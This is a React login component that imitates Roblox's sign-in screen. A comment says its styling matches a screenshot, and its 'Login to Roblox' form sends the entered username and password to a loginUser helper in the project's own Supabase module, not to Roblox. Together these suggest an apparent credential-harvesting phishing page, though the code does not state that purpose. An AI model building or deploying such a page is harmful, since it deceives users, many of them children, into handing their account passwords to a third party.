import React, { useState } from 'react';
import { Loader2, Eye, EyeOff, AlertCircle } from 'lucide-react';
import { loginUser } from '../lib/supabase';

export default function LoginCard({
  onNavigateToSignup,
  onLoginSuccess,
  onOpenForgotPassword,
  onOpenEmailCode,
  onOpenQuickSignIn,
}) {
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!identifier.trim()) {
      setErrorMsg('Please enter your username, email, or phone number.');
      return;
    }
    if (!password) {
      setErrorMsg('Please enter your password.');
      return;
    }

    setIsLoading(true);
    setErrorMsg('');

    try {
      const res = await loginUser(identifier, password);
      if (res.success) {
        onLoginSuccess({
          username: res.user.username || identifier,
          source: res.source,
        });
      } else {
        setErrorMsg(res.error || 'Incorrect username or password. Please try again.');
      }
    } catch (err) {
      setErrorMsg('An unexpected error occurred during login.');
      console.error(err);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="w-full max-w-[410px] mx-auto bg-[#22242a]/95 backdrop-blur-md rounded-xl p-7 sm:p-8 shadow-2xl border border-zinc-700/60 text-left transition-all">
      {/* Title */}
      <h1 className="text-white text-2xl font-black text-center mb-6 tracking-tight select-none">
        Login to Roblox
      </h1>

      {/* Error Banner */}
      {errorMsg && (
        <div className="mb-4 p-3 bg-red-950/70 border border-red-600/70 rounded-md text-red-200 text-xs flex items-start gap-2">
          <AlertCircle className="w-4 h-4 text-red-400 shrink-0 mt-0.5" />
          <span>{errorMsg}</span>
        </div>
      )}

      <form onSubmit={handleSubmit} className="space-y-3.5">
        {/* Username/Email/Phone Input */}
        <div>
          <input
            type="text"
            value={identifier}
            onChange={(e) => {
              setIdentifier(e.target.value);
              setErrorMsg('');
            }}
            placeholder="Username/Email/Phone"
            autoComplete="username"
            className="w-full bg-[#353740] hover:bg-[#3b3d47] focus:bg-[#353740] border border-[#444752] focus:border-zinc-300 text-white placeholder-[#8e929c] text-sm rounded-md px-3.5 py-3 outline-none transition-colors"
          />
        </div>

        {/* Password Input */}
        <div className="relative">
          <input
            type={showPassword ? 'text' : 'password'}
            value={password}
            onChange={(e) => {
              setPassword(e.target.value);
              setErrorMsg('');
            }}
            placeholder="Password"
            autoComplete="current-password"
            className="w-full bg-[#353740] hover:bg-[#3b3d47] focus:bg-[#353740] border border-[#444752] focus:border-zinc-300 text-white placeholder-[#8e929c] text-sm rounded-md px-3.5 py-3 pr-10 outline-none transition-colors"
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-3.5 top-1/2 -translate-y-1/2 text-zinc-400 hover:text-zinc-200 transition-colors focus:outline-none"
            tabIndex={-1}
          >
            {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
          </button>
        </div>

        {/* Log In Button (Bordered dark style matching screenshot) */}
        <div className="pt-1">
          <button
            type="submit"
            disabled={isLoading}
            className="w-full bg-[#272930] hover:bg-[#30333b] border border-zinc-500 hover:border-zinc-300 text-white font-bold text-sm rounded-md py-2.5 transition-all duration-150 flex items-center justify-center gap-2 cursor-pointer active:scale-[0.99] select-none shadow-sm"
          >
            {isLoading ? (
              <>
                <Loader2 className="w-4 h-4 animate-spin text-white" />
                <span>Logging In...</span>
              </>
            ) : (
              'Log In'
            )}
          </button>
        </div>

        {/* Forgot Password Link */}
        <div className="text-center pt-1">
          <button
            type="button"
            onClick={onOpenForgotPassword}
            className="text-xs text-zinc-300 hover:text-white font-medium hover:underline transition-colors cursor-pointer select-none"
          >
            Forgot Password or Username?
          </button>
        </div>

        {/* Subtle Horizontal Divider Line */}
        <div className="w-full border-t border-zinc-700/60 my-4" />

        {/* Email Me a One-Time Code Button */}
        <div>
          <button
            type="button"
            onClick={onOpenEmailCode}
            className="w-full bg-[#3e424c] hover:bg-[#484d58] text-white font-bold text-sm rounded-md py-2.5 transition-colors shadow-sm cursor-pointer active:scale-[0.99] select-none"
          >
            Email Me a One-Time Code
          </button>
        </div>

        {/* Quick Sign-in Button */}
        <div>
          <button
            type="button"
            onClick={onOpenQuickSignIn}
            className="w-full bg-[#3e424c] hover:bg-[#484d58] text-white font-bold text-sm rounded-md py-2.5 transition-colors shadow-sm cursor-pointer active:scale-[0.99] select-none"
          >
            Quick Sign-in
          </button>
        </div>

        {/* Don't have an account? Sign Up */}
        <div className="text-center text-xs text-zinc-400 font-medium pt-3 select-none">
          Don't have an account?{' '}
          <button
            type="button"
            onClick={onNavigateToSignup}
            className="text-white font-bold hover:underline ml-1 cursor-pointer"
          >
            Sign Up
          </button>
        </div>
      </form>
    </div>
  );
}
